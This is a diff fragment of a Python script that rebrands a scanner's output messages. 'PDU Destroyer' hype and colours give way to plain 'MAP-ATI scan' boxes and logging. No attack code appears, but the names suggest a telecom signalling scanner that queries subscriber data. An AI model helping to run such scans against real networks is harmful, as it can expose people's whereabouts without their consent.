-        final_color = (DestroyerColors.GODLIKE_GREEN if len(transmission_failures) == 0 and len(pdu_failures) == 0
-                      else DestroyerColors.FIRE_ORANGE if len(transmission_failures) > 0
-                      else DestroyerColors.BLOOD_RED)
-        
-        print_destroyer_box("LEGENDARY SCAN COMPLETED!", summary_content, final_color)
+        print_elegant_box("SCAN COMPLETED SUCCESSFULLY!", summary_content, 
+                         Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
         
     except KeyboardInterrupt:
         interrupt_content = [
-            f"🛑 LEGENDARY SCAN INTERRUPTED by user command",
-            f"📊 Partial results may be available in: {csv_file}",
-            f"📝 Logs preserved in: {log_file}"
+            f"🛑 Scan interrupted by user",
+            f"📊 Partial results may be available in: {csv_file}"
         ]
-        print_destroyer_box("SCAN INTERRUPTED", interrupt_content, DestroyerColors.FIRE_ORANGE)
+        print_elegant_box("SCAN INTERRUPTED", interrupt_content, 
+                         Colors.YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
         
     except Exception as e:
         error_content = [
-            f"💥 LEGENDARY SCAN EXPLODED with critical error: {e}",
-            f"📝 Check legendary log for details: {log_file}",
-            f"🔧 This may require LEGENDARY debugging"
+            f"❌ Scan failed with error: {e}",
+            f"📝 Check log file for details: {log_file}"
         ]
-        print_destroyer_box("CRITICAL FAILURE", error_content, DestroyerColors.BLOOD_RED)
-        
-        if legendary_logger:
-            legendary_logger.error(f"LEGENDARY main execution error: {e}", exc_info=True)
+        print_elegant_box("SCAN FAILED", error_content, 
+                         Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
+        if logger:
+            logger.error(f"Main execution error: {e}", exc_info=True)
         sys.exit(1)
     
     finally:
-        if legendary_logger:
-            legendary_logger.info("LEGENDARY PDU Destroyer scan completed with MAXIMUM power")
+        if logger:
+            logger.info("Professional MAP-ATI scan completed")
 
 if __name__ == "__main__":
     try:
-        legendary_main()
+        main_professional()
     except Exception as e:
-        error_content = [
-            f"💥 CATASTROPHIC SYSTEM FAILURE: {e}",
-            f"🔧 LEGENDARY DEBUGGING REQUIRED"
-        ]
-        print_destroyer_box("SYSTEM MELTDOWN", error_content, DestroyerColors.LASER_RED)
+        error_content = [f"❌ Fatal error: {e}"]
+        print_elegant_box("FATAL ERROR", error_content, Colors.BRIGHT_RED, Colors.BRIGHT_WHITE, Colors.WHITE)
         sys.exit(1)
